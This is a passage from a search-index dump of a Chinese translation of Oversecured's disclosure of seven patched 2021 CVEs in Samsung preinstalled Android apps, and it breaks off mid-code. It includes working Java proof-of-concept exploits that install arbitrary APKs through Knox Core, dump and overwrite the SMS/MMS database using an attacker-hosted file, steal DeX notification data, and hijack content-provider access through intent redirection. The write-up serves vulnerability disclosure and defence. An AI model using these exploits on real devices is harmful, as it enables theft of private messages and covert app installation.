\u4e2d\u7684\u6f0f\u6d1e SecSettings \u662f\u4e09\u661f\u9884\u88c5\u7684\u8bbe\u7f6e\u5e94\u7528\u7a0b\u5e8f\u3002 \u4ece UID 1000 ( system )\u8bfb\u53d6\u548c\u5199\u5165\u4efb\u610f\u6587\u4ef6\u7684\u6f0f\u6d1e\u7531\u4e24\u4e2a\u7ec4\u4ef6\u7ec4\u6210\uff1a \u8bbf\u95ee\u4efb\u610f*\u5185\u5bb9\u63d0\u4f9b\u8005 \u5728 com.sec.imsservice \u5e94\u7528\u7a0b\u5e8f\u4e2d\u5229\u7528\u4e0d\u5b89\u5168\u7684 FileProvider \u8fd9\u4e2a\u94fe\u662f\u552f\u4e00\u53ef\u80fd\u7684\uff0c\u56e0\u4e3a\u4e24\u4e2a\u5e94\u7528\u7a0b\u5e8f\u90fd\u4f7f\u7528\u5728\u5b83\u4eec\u7684 AndroidManifest.xml : \u4e2d\u6307\u5b9a\u7684\u76f8\u540c\u5171\u4eab UID android:sharedUserId=\"android.uid.system\" \u3002\u4e8b\u5b9e\u4e0a\uff0c\u8fd9\u4e2a\u8bbe\u7f6e\u610f\u5473\u7740\u4e24\u4e2a\u4e0d\u540c\u7684\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u5b8c\u5168\u5171\u4eab\u6240\u6709\u8d44\u6e90\uff0c\u5e76\u4e14\u53ef\u4ee5\u5b8c\u5168\u8bbf\u95ee\u5f7c\u6b64\u7684\u7ec4\u4ef6\u3002SecSettings \u4e2d\u7684\u6f0f\u6d1e\u662f Google \u7684\u3002\u5b83\u5df2\u62a5\u544a\u7ed9 Android VDP\u3002\u5956\u91d1\u4e3a2000\u7f8e\u5143\u3002\u6211\u4eec\u5c06\u5728\u7b2c 2 \u90e8\u5206\u6587\u7ae0\u4e2d\u62ab\u9732\u6b64\u95ee\u9898\u7684\u8be6\u7ec6\u4fe1\u606f\u3002 \u4e09\u661f DeX \u7cfb\u7edf UI \u4e2d\u7684\u6f0f\u6d1e \u6b64\u6f0f\u6d1e\u5141\u8bb8\u653b\u51fb\u8005 \u4ece\u7528\u6237\u901a\u77e5\u4e2d\u7a83\u53d6\u6570\u636e \uff0c\u8fd9\u4e9b\u6570\u636e\u901a\u5e38\u5305\u62ec Telegram\u3001Google Docs \u6587\u4ef6\u5939\u3001\u4e09\u661f\u7535\u5b50\u90ae\u4ef6\u548c Gmail \u6536\u4ef6\u7bb1\u7684\u804a\u5929\u63cf\u8ff0\uff0c\u4ee5\u53ca\u6765\u81ea\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u901a\u77e5\u7684\u4fe1\u606f\u3002 \u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u6fc0\u6d3b\u8be5\u529f\u80fd\u5728 SD \u5361\u4e0a\u7684\u5168\u5c40\u53ef\u8bfb\u76ee\u5f55\u4e2d\u521b\u5efa\u5907\u4efd\uff1a \u7531\u4e8e\u6587\u4ef6\u5728\u521b\u5efa\u5907\u4efd\u540e\u7acb\u5373\u88ab\u5220\u9664\uff0c\u56e0\u6b64\u6211\u4eec\u6dfb\u52a0\u4e86\u521b\u5efa\u5907\u4efd\u526f\u672c\u7684\u529f\u80fd\u4ee5\u9632\u6b62\u8fd9\u79cd\u60c5\u51b5\u53d1\u751f\u3002 \u6982\u5ff5\u8bc1\u660e\uff1a final File root = Environment.getExternalStorageDirectory(); final File policyFile = new File(root, \"notification_policy.xml\"); final File backupCopy = new File(root, \"backup\"); Intent i = new Intent(\"com.samsung.android.intent.action.REQUEST_BACKUP_NOTIFICATION\"); i.setClassName(\"com.samsung.desktopsystemui\", \"com.samsung.desktopsystemui.NotificationBackupRestoreManager$NotificationBnRReceiver\"); i.putExtra(\"SAVE_PATH\", root.getAbsolutePath()); i.putExtra(\"SESSION_KEY\", \"not_empty\"); sendBroadcast(i); new Thread(() -> { while (true) { if(policyFile.exists()) { try { InputStream i = new FileInputStream(policyFile); OutputStream o = new FileOutputStream(backupCopy); IOUtils.copy(i, o); i.close(); o.close(); } catch (Throwable th) { throw new RuntimeException(th); } } } }).start(); TelephonyUI \u4e2d\u7684\u6f0f\u6d1e \u63a5\u6536\u5668 com.samsung.android.app.telephonyui.carrierui.photoring.model.PhotoringReceiver \u88ab\u5bfc\u51fa\u3002\u5b83\u5c06\u6587\u4ef6\u4ece \u4e2d\u6307\u5b9a\u7684 URL \u4fdd\u5b58\u5230 \u4e2d\u6307\u5b9a photoring_uri \u7684\u8def\u5f84 down_file \u3002\u8fd9\u662f\u7531\u8fc7\u5ea6\u5b89\u5168\u7684 Android \u626b\u63cf\u4eea\u68c0\u6d4b\u5230\u7684\uff1a \u552f\u4e00\u7684\u8981\u6c42\u662f\u670d\u52a1\u5668\u54cd\u5e94\u7684\u5185\u5bb9\u7c7b\u578b\u5e94\u8be5\u662f image/* or video/* \u3002\u56e0\u6b64\uff0c\u6211\u4eec\u4f7f\u7528\u6587\u4ef6\u540d test.mp4 \uff0cAmazon S3 \u81ea\u52a8\u6307\u5b9a video/mp4 \u54cd\u5e94\u4e2d\u7684\u5185\u5bb9\u7c7b\u578b\u3002 \u6982\u5ff5\u8bc1\u660e\uff1a File dbPath = new File(getPackageManager().getApplicationInfo(\"com.android.providers.telephony\", 0).dataDir, \"databases/mmssms.db\"); Intent i = new Intent(\"com.samsung.android.app.telephonyui.action.DOWNLOAD_PHOTORING\"); i.setClassName(\"com.samsung.android.app.telephonyui\", \"com.samsung.android.app.telephonyui.carrierui.photoring.model.PhotoringReceiver\"); i.putExtra(\"photoring_uri\", \"https://redacted.s3.amazonaws.com/test.mp4\"); i.putExtra(\"down_file\", dbPath.getAbsolutePath()); sendBroadcast(i); \u7ed3\u679c\uff0c\u5e26\u6709 SMS/MMS \u6d88\u606f\u7684\u6587\u4ef6\u88ab\u653b\u51fb\u8005\u63a7\u5236\u7684\u5185\u5bb9\u8986\u76d6\u3002 PhotoTable \u4e2d\u7684\u6f0f\u6d1e \u5728 PhotoTable \u4e2d\uff0c\u6211\u4eec\u53d1\u73b0\u4e86 Intent redirection \uff0c\u5b83\u5141\u8bb8\u5bf9\u5185\u5bb9\u63d0\u4f9b\u8005\u7684\u8bbf\u95ee\u88ab\u62e6\u622a\uff1a \u6211\u4eec\u5229\u7528\u8be5\u6f0f\u6d1e\u52ab\u6301\u4e86\u8bbf\u95ee SD \u5361\u7684\u6743\u9650\u3002\u8fd9\u662f\u6982\u5ff5\u8bc1\u660e\uff1a protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); handle(getIntent()); } protected void onNewIntent(Intent intent) { super.onNewIntent(intent); handle(intent); } private void handle(Intent intent) { if(\"evil\".equals(intent.getAction())) { String uri = MediaStore.Images.Media.insertImage(getContentResolver(), Bitmap.createBitmap(1, 1, Bitmap.Config.ARGB_8888), \"Title_1337\", \"Description_1337\"); Log.d(\"evil\", \"Result: \" + uri); } else { Intent next = new Intent(\"evil\", MediaStore.Images.Media.EXTERNAL_CONTENT_URI); next.setFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION); next.setClass(this, getClass()); Intent i = new Intent(); i.setClassName(\"com.android.dreams.phototable\", \"com.android.dreams.phototable.PermissionsRequestActivity\"); i.putExtra(\"previous_intent\", next); i.putExtra(\"permission_list\", new String[0]); startActivity(i); } } from \u539f\u6587\u94fe\u63a5\uff1a https://www.ddosi.org/cve-2021-25356/","title":"\u9ed1\u5ba2\u53ef\u4ee5\u5229\u7528\u4e09\u661f\u9884\u88c5\u7684\u5e94\u7528\u7a0b\u5e8f\u6765\u76d1\u89c6\u7528\u6237"},{"location":"Android/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#_1","text":"\u4e09\u661f\u9884\u88c5\u7684 Android \u5e94\u7528\u7a0b\u5e8f\u4e2d\u62ab\u9732\u4e86\u591a\u4e2a\u4e25\u91cd\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u5982\u679c\u6210\u529f\u5229\u7528\u8fd9\u4e9b\u6f0f\u6d1e\uff0c \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u672a\u7ecf\u7528\u6237\u540c\u610f\u7684\u60c5\u51b5\u4e0b\u8bbf\u95ee\u4e2a\u4eba\u6570\u636e\u5e76\u63a7\u5236\u8bbe\u5907\u3002 \u201c\u8fd9\u4e9b\u6f0f\u6d1e\u7684\u5f71\u54cd\u53ef\u80fd\u5141\u8bb8\u653b\u51fb\u8005\u8bbf\u95ee\u548c\u7f16\u8f91\u53d7\u5bb3\u8005\u7684\u8054\u7cfb\u4eba\u3001\u7535\u8bdd\u3001\u77ed\u4fe1/\u5f69\u4fe1\uff0c\u5b89\u88c5\u5177\u6709\u8bbe\u5907\u7ba1\u7406\u5458\u6743\u9650\u7684\u4efb\u610f\u5e94\u7528\u7a0b\u5e8f\uff0c\u6216\u4ee3\u8868\u7cfb\u7edf\u7528\u6237\u8bfb\u5199\u4efb\u610f\u6587\u4ef6\uff0c\u8fd9\u53ef\u80fd\u4f1a\u66f4\u6539\u8bbe\u5907\u7684\u8bbe\u7f6e\uff0c\u201d\u79fb\u52a8\u5b89\u5168\u521d\u521b\u516c\u53f8 Oversecured \u7684\u521b\u59cb\u4eba Sergey Toshin\u5728\u5468\u56db\u53d1\u5e03\u7684\u4e00\u4efd\u5206\u6790\u62a5\u544a\u4e2d \u8868\u793a \u3002 Toshin \u4e8e 2021 \u5e74 2 \u6708\u5411\u4e09\u661f\u62a5\u544a\u4e86\u8fd9\u4e9b\u7f3a\u9677\uff0c\u968f\u540e\u5236\u9020\u5546 \u53d1\u5e03 \u4e86 \u8865\u4e01\uff0c \u4f5c\u4e3a\u5176 4 \u6708\u548c 5 \u6708\u7684\u6708\u5ea6\u5b89\u5168\u66f4\u65b0\u7684\u4e00\u90e8\u5206\u3002","title":"\u9ed1\u5ba2\u53ef\u4ee5\u5229\u7528\u4e09\u661f\u9884\u88c5\u7684\u5e94\u7528\u7a0b\u5e8f\u6765\u76d1\u89c6\u7528\u6237"},{"location":"Android/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#_2","text":"CVE-2021-25356 \u2013 \u6258\u7ba1\u4f9b\u5e94\u4e2d\u7684\u7b2c\u4e09\u65b9\u8eab\u4efd\u9a8c\u8bc1\u7ed5\u8fc7 CVE-2021-25388 \u2013 Knox Core \u4e2d\u7684\u4efb\u610f\u5e94\u7528\u7a0b\u5e8f\u5b89\u88c5\u6f0f\u6d1e CVE-2021-25390 \u2013 PhotoTable \u4e2d\u7684 \u610f\u56fe\u91cd\u5b9a\u5411 CVE-2021-25391 \u2013 \u5b89\u5168\u6587\u4ef6\u5939\u4e2d\u7684\u610f\u56fe\u91cd\u5b9a\u5411 CVE-2021-25392 \u2013 \u53ef\u4ee5\u8bbf\u95ee DeX \u7684 \u901a\u77e5\u7b56\u7565\u6587\u4ef6 CVE-2021-25393 \u2013 \u53ef\u4ee5\u4f5c\u4e3a\u7cfb\u7edf\u7528\u6237\u5bf9\u4efb\u610f\u6587\u4ef6\u8fdb\u884c\u8bfb/\u5199\u8bbf\u95ee\uff08\u5f71\u54cd\u8bbe\u7f6e\u5e94\u7528\u7a0b\u5e8f\uff09 CVE-2021-25397 \u2013 TelephonyUI \u4e2d\u7684 \u4efb\u610f\u6587\u4ef6\u5199\u5165 \u8fd9\u4e9b\u6f0f\u6d1e\u7684\u5f71\u54cd\u610f\u5473\u7740\u5b83\u4eec\u53ef\u80fd\u88ab\u5229\u7528\u6765\u5b89\u88c5\u4efb\u610f\u7b2c\u4e09\u65b9\u5e94\u7528\u7a0b\u5e8f\u3001\u6388\u4e88\u8bbe\u5907\u7ba1\u7406\u5458\u6743\u9650\u4ee5\u5220\u9664\u5176\u4ed6\u5df2\u5b89\u88c5\u7684\u5e94\u7528\u7a0b\u5e8f\u6216\u7a83\u53d6\u654f\u611f\u6587\u4ef6\u3001\u4ee5\u7cfb\u7edf\u7528\u6237\u8eab\u4efd\u8bfb\u53d6\u6216\u5199\u5165\u4efb\u610f\u6587\u4ef6\uff0c\u751a\u81f3\u6267\u884c\u7279\u6743\u64cd\u4f5c\u3002 \u5728\u6982\u5ff5\u9a8c\u8bc1 (PoC) \u6f14\u793a\u4e2d\uff0cOversecured \u786e\u5b9a\u53ef\u4ee5\u5229\u7528 PhotoTable \u548c Secure Folder \u4e2d\u7684\u610f\u56fe\u91cd\u5b9a\u5411\u7f3a\u9677\u6765\u52ab\u6301\u5e94\u7528\u7a0b\u5e8f\u8bbf\u95ee SD \u5361\u548c\u8bfb\u53d6\u5b58\u50a8\u5728\u624b\u673a\u4e2d\u7684\u8054\u7cfb\u4eba\u7684\u6743\u9650\u3002\u540c\u6837\uff0c\u901a\u8fc7\u5229\u7528 CVE-2021-25397 \u548c CVE-2021-25392\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u7528\u6076\u610f\u5185\u5bb9\u8986\u76d6\u5b58\u50a8 SMS/MMS \u6d88\u606f\u7684\u6587\u4ef6\uff0c\u5e76\u4ece\u7528\u6237\u901a\u77e5\u4e2d\u7a83\u53d6\u6570\u636e\u3002 \u5efa\u8bae\u4e09\u661f\u8bbe\u5907\u6240\u6709\u8005\u5e94\u7528\u8be5\u516c\u53f8\u7684\u6700\u65b0\u56fa\u4ef6\u66f4\u65b0\uff0c\u4ee5\u907f\u514d\u4efb\u4f55\u6f5c\u5728\u7684\u5b89\u5168\u98ce\u9669\u3002","title":"\u4e03\u4e2a\u6f0f\u6d1e\u5217\u8868\u5982\u4e0b:"},{"location":"Android/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#_3","text":"\u8fd9\u4e9b \u6f0f\u6d1e\u53ef\u80fd\u5bfc\u81f4\u8fdd\u53cd GDPR \uff0c\u6211\u4eec\u5f88\u9ad8\u5174\u80fd\u591f\u5e2e\u52a9\u4e09\u661f\u53ca\u65f6\u8bc6\u522b\u548c\u4fee\u590d\u8fd9\u4e9b\u6f0f\u6d1e\u3002 \u5982\u679c\u60a8\u662f\u5f00\u53d1\u4eba\u5458\u6216\u5e94\u7528\u7a0b\u5e8f\u6240\u6709\u8005\uff0c\u60a8\u53ef\u4ee5\u5c06 Oversecured \u96c6\u6210\u5230\u60a8\u7684 CI/CD \u4e2d\uff0c\u4ee5\u4e3b\u52a8\u4fdd\u62a4\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u514d\u53d7\u8fd9\u4e9b\u6f0f\u6d1e\u7684\u4fb5\u5bb3\u3002 CI/CD \u8fc7\u7a0b\u4e5f\u53ef\u4ee5\u4f7f\u7528\u63d2\u4ef6\u5b8c\u5168\u81ea\u52a8\u5316\u3002\u6211\u4eec\u7684\u89e3\u51b3\u65b9\u6848\u5c06\u6301\u7eed\u76d1\u63a7\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u5728\u68c0\u6d4b\u5230\u4efb\u4f55\u65b0\u6f0f\u6d1e\u65f6\u63d0\u9192\u60a8\u3002 \u4ece Quick Start \u5f00\u59cb\u8bd5\u7528\uff0c\u5f00\u59cb\u4fdd\u62a4\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u6216\u8005\u60a8\u53ef\u4ee5 \u5728\u6b64\u5904 \u8054\u7cfb\u6211\u4eec\u4ee5\u4e86\u89e3\u66f4\u591a\u4fe1\u606f\u5e76\u83b7\u53d6\u6f14\u793a\u3002 \u5982\u679c\u60a8\u662f\u4e00\u540d\u5b89\u5168\u7814\u7a76\u4eba\u5458\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528 Oversecured \u7684\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u626b\u63cf\u5668\u626b\u63cf\u8fd9\u4e9b\u9519\u8bef\uff0c\u4ece\u800c\u81ea\u52a8\u6267\u884c\u9519\u8bef\u68c0\u6d4b\u8fc7\u7a0b\u3002\u60a8\u6240\u8981\u505a\u7684\u5c31\u662f \u6ce8\u518c \u5e76\u4e0a\u4f20\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u6587\u4ef6\u3002\u6211\u4eec\u7684\u626b\u63cf\u4eea\u5c06\u8d1f\u8d23\u5176\u4f59\u7684\u5de5\u4f5c\u3002","title":"\u6f0f\u6d1e\u8be6\u60c5"},{"location":"Android/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#_4","text":"CVE SVE \u53d7\u5f71\u54cd\u7684\u5e94\u7528 \u63cf\u8ff0 \u5956\u52b1\u91d1\u989d CVE-2021-25388 SVE-2021-20636 Knox Core (com.samsung.android.knox.containercore) \u5b89\u88c5\u4efb\u610f\u5e94\u7528\u7a0b\u5e8f\u548c\u8bbe\u5907\u8303\u56f4\u5185\u7684\u4efb\u610f\u6587\u4ef6\u76d7\u7a83 1720 \u7f8e\u5143 CVE-2021-25356 SVE-2021-20733 \u6258\u7ba1\u914d\u7f6e (com.android.managedprovisioning) \u5b89\u88c5\u7b2c\u4e09\u65b9\u5e94\u7528\u7a0b\u5e8f\u5e76\u6388\u4e88\u4ed6\u4eec\u8bbe\u5907\u7ba1\u7406\u5458\u6743\u9650 7000 \u7f8e\u5143 CVE-2021-25391 SVE-2021-20500 \u5b89\u5168\u6587\u4ef6\u5939 (com.samsung.knox.securefolder) \u8bbf\u95ee\u4efb\u610f*\u5185\u5bb9\u63d0\u4f9b\u5546 1050 \u7f8e\u5143 CVE-2021-25393 SVE-2021-20731 SecSettings (com.android.settings) \u83b7\u5f97\u5bf9\u4efb\u610f*\u5185\u5bb9\u63d0\u4f9b\u8005\u7684\u8bbf\u95ee\u6743\u9650\u5bfc\u81f4\u4ee5\u7cfb\u7edf\u7528\u6237\u8eab\u4efd\uff08UID 1000\uff09\u5bf9\u4efb\u610f\u6587\u4ef6\u8fdb\u884c\u8bfb/\u5199\u8bbf\u95ee 5460 \u7f8e\u5143 CVE-2021-25392 SVE-2021-20690 \u4e09\u661f DeX \u7cfb\u7edf UI (com.samsung.desktopsystemui) \u80fd\u591f\u7a83\u53d6\u901a\u77e5\u7b56\u7565\u914d\u7f6e 330 \u7f8e\u5143 CVE-2021-25397 SVE-2021-20716 TelephonyUI (com.samsung.android.app.telephonyui) \uff08\u8986\u76d6\uff09\u5c06\u4efb\u610f\u6587\u4ef6\u5199\u5165\u4e3a UID 1001 4850 \u7f8e\u5143 CVE-2021-25390 SVE-2021-20724 PhotoTable (com.android.dreams.phototable) \u610f\u56fe\u91cd\u5b9a\u5411\u5bfc\u81f4\u8bbf\u95ee\u4efb\u610f\u5185\u5bb9\u63d0\u4f9b\u8005 280 \u7f8e\u5143","title":"\u6f0f\u6d1e\u8be6\u60c5\u5217\u8868\uff1a"},{"location":"Android/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#knox-core","text":"\u9996\u5148\uff0c\u6211\u4eec\u626b\u63cf\u4e86 Knox Core \u5e94\u7528\u7a0b\u5e8f\uff0c\u53d1\u73b0\u4ece SD \u5361\u5b89\u88c5\u4e86\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff1a \u4e8b\u5b9e\u8bc1\u660e\uff0c\u6b64\u529f\u80fd\u662f\u901a\u8fc7\u5bfc\u51fa\u7684\u670d\u52a1\u6fc0\u6d3b\u7684 com.samsung.android.knox.containercore.provisioning.DualDARInitService \uff1a <service android:name=\"com.samsung.android.knox.containercore.provisioning.DualDARInitService\" android:exported=\"true\"> <intent-filter> <action android:name=\"com.samsung.android.knox.containercore.provisioning.DualDARInitService\"/> </intent-filter> </service> \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7 dualdar-config-client-location \u53c2\u6570\u4f20\u9012\u4efb\u610f URI\uff0c\u8be5\u53c2\u6570\u5c06\u88ab\u590d\u5236\u5230 /sdcard/Android/data/com.samsung.android.knox.containercore/files/client_downloaded_knox_app.apk \uff0c\u8fd9\u662f\u4e00\u4e2a\u4e16\u754c\u53ef\u8bfb\u7684\u4f4d\u7f6e\u3002 \u4e4b\u540e\uff0c\u5c06\u542f\u52a8\u5e94\u7528\u7a0b\u5e8f\u5b89\u88c5\u8fc7\u7a0b\uff1a private void proceedPrerequisiteForDualDARWithWPCOD(Intent intent) { if (intent.getBooleanExtra(\"DUAL_DAR_IS_WPCOD\", false)) { int intExtra = intent.getIntExtra(\"android.intent.extra.user_handle\", UserHandle.myUserId()); Bundle bundleExtra = intent.getBundleExtra(\"DUAL_DAR_PARAMS\"); String string = bundleExtra.getString(\"dualdar-config-client-package\", null); if (!TextUtils.isEmpty(string)) { DDLog.m4d(\"KNOXCORE::DualDARInitService\", \"Start proceedPrerequisiteForDualDARWithWPCOD 3rd-party crypto\"); String string2 = bundleExtra.getString(\"dualdar-config-client-location\"); // attacker-controlled URI DDLog.m4d(\"KNOXCORE::DualDARInitService\", \"DualDARPolicy.KEY_CONFIG_CLIENT_LOCATION = \" + string2); if (TextUtils.isEmpty(string2)) { notifyMPError(5); } else if (string2.startsWith(\"file://\")) { String str = getExternalFilesDir(null) + \"/client_downloaded_knox_app.apk\"; try { // attacker-controlled file is copied to the public location ((SemRemoteContentManager) this.mContext.getSystemService(\"rcp\")).copyFile(intExtra, string2.replaceFirst(\"^file://\", \"\"), intExtra, str); installPackageTask(intent, string, str); // and then installed } catch (RemoteException unused) { DDLog.m3e(\"KNOXCORE::DualDARInitService\", \"copyFile failed.\"); notifyMPError(5); } } else if (string2.startsWith(\"https://\")) { downloadPackageTask(intent, string, string2); } else { notifyMPError(5); } } else { DDLog.m4d(\"KNOXCORE::DualDARInitService\", \"Start proceedPrerequisiteForDualDARWithWPCOD native crypto\"); startRunnerTask(intent); } } }","title":"Knox Core \u4e2d\u7684\u6f0f\u6d1e"},{"location":"Android/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#_5","text":"protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); try { Bundle bundle = new Bundle(); bundle.putString(\"dualdar-config-client-package\", \"test.exampleapp\"); bundle.putString(\"dualdar-config-client-location\", Uri.fromFile(copyFile()).toString()); Intent i = new Intent(\"com.samsung.android.knox.containercore.provisioning.DualDARInitService\"); i.setClassName(\"com.samsung.android.knox.containercore\", \"com.samsung.android.knox.containercore.provisioning.DualDARInitService\"); i.putExtra(\"DualDARServiceEventFlag\", 500); i.putExtra(\"DUAL_DAR_IS_WPCOD\", true); i.putExtra(\"DUAL_DAR_PARAMS\", bundle); startService(i); } catch (Throwable th) { throw new RuntimeException(th); } } private File copyFile() throws Throwable { File file = new File(getApplicationInfo().dataDir, \"app.apk\"); InputStream i = getAssets().open(\"app-release.apk\"); OutputStream o = new FileOutputStream(file); IOUtils.copy(i, o); i.close(); o.close(); return file; }","title":"\u5b89\u88c5\u4efb\u610f\u5e94\u7528\u7a0b\u5e8f\u7684\u6982\u5ff5\u8bc1\u660e"},{"location":"Android/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#smsmms","text":"protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); startDump(); try { File dbPath = new File(getPackageManager().getApplicationInfo(\"com.android.providers.telephony\", 0).dataDir, \"databases/mmssms.db\"); Bundle bundle = new Bundle(); bundle.putString(\"dualdar-config-client-package\", \"test.exampleapp\"); bundle.putString(\"dualdar-config-client-location\", Uri.fromFile(dbPath).toString()); Intent i = new Intent(\"com.samsung.android.knox.containercore.provisioning.DualDARInitService\"); i.setClassName(\"com.samsung.android.knox.containercore\", \"com.samsung.android.knox.containercore.provisioning.DualDARInitService\"); i.putExtra(\"DualDARServiceEventFlag\", 500); i.putExtra(\"DUAL_DAR_IS_WPCOD\", true); i.putExtra(\"DUAL_DAR_PARAMS\", bundle); new Thread(() -> { for(int j = 1; j < 1000; j++) { startService(i); try { Thread.sleep(500); } catch (Throwable th) { throw new RuntimeException(th); } } }).start(); } catch (Throwable th) { throw new RuntimeException(th); } } private void startDump() { final String path = \"/sdcard/Android/data/com.samsung.android.knox.containercore/files/client_downloaded_knox_app.apk\"; ContentValues values = new ContentValues(); values.put(\"_data\", path); Uri uri = getContentResolver().insert(MediaStore.Files.getContentUri(\"external\"), values); new Thread(new Runnable() { public void run() { while (true) { try { InputStream i = getContentResolver().openInputStream(uri); String data = IOUtils.toString(i); Log.d(\"evil\", data); i.close(); } catch (Throwable th) { } } } }).start(); }","title":"SMS/MMS \u6587\u4ef6\u76d7\u7a83\u7684\u6982\u5ff5\u8bc1\u660e"},{"location":"Android/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#poc","text":"\u542f\u52a8\u670d\u52a1\u5c06\u6240\u9700\u6587\u4ef6\u590d\u5236\u5230\u516c\u5171\u4f4d\u7f6e\uff08\u7531\u4e8e\u8fd9\u662f\u4e00\u4e2a\u65e0\u6548\u7684APK\u6587\u4ef6\uff0c\u5b89\u88c5\u9519\u8bef\u540e\u4f1a\u7acb\u5373\u5220\u9664\uff09\uff0c \u7136\u540e\uff0c client_downloaded_knox_app.apk \u8bfb\u53d6\u6587\u4ef6\u3002 \u6ce8\u610f\uff1a \u6211\u4eec\u4f7f\u7528 MediaStore.Files \u662f\u56e0\u4e3a\u6700\u65b0\u7684 Android \u7248\u672c\u4e0d\u5141\u8bb8\u76f4\u63a5\u8bfb\u53d6\u5c5e\u4e8e\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u7684\u5916\u90e8\u5b58\u50a8\uff0c\u4f46\u8fd9\u53ef\u4ee5\u4f7f\u7528 Android Media Content Provider \u7ed5\u8fc7\u3002","title":"PoC \u7684\u5de5\u4f5c\u539f\u7406\u5982\u4e0b\uff1a"},{"location":"Android/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#_6","text":"Managed Provisioning \u662f\u6240\u6709\u4e09\u661f\u8bbe\u5907\u4e0a\u9884\u88c5\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c \u7528\u4e8e\u4f01\u4e1a\u8bbe\u5907\u5b9a\u5236 \u3002 \u518d\u4e00\u6b21\uff0c\u5728\u6d4b\u8bd5 Managed Provisioning \u65f6\uff0c\u6211\u4eec\u53d1\u73b0\u4e86\u4ece\u516c\u5171\u76ee\u5f55\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f\u7684\u6f0f\u6d1e\uff1a \u6700\u521d\u7684\u5e94\u7528\u7a0b\u5e8f\u662f\u7531 AOSP \u5f00\u53d1\u7684\uff0c\u5b83\u6709\u5b89\u5168\u68c0\u67e5\u6765\u9a8c\u8bc1\u4efb\u4f55\u4ea4\u4e92\u7684\u6388\u6743\u3002\u4e09\u661f\u4fee\u6539\u4e86\u6258\u7ba1\u914d\u7f6e\u5e94\u7528\u7a0b\u5e8f\uff0c\u4ee5\u6dfb\u52a0\u4e0e\u5176\u751f\u6001\u7cfb\u7edf\u548c Knox Core \u4ea4\u4e92\u6240\u9700\u7684\u529f\u80fd\u3002 \u56e0\u6b64\uff0c\u5728\u4e09\u661f\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u503c\u6765\u7ed5\u8fc7\u6b64\u68c0\u67e5 com.samsung.knox.container.requestId \uff1a int intExtra = intent.getIntExtra(\"com.samsung.knox.container.requestId\", -1); if (intExtra > 0) { ProvisionLogger.logw(\"Skipping verifyActionAndCaller\"); // the bypass } else if (!verifyActionAndCaller(intent, 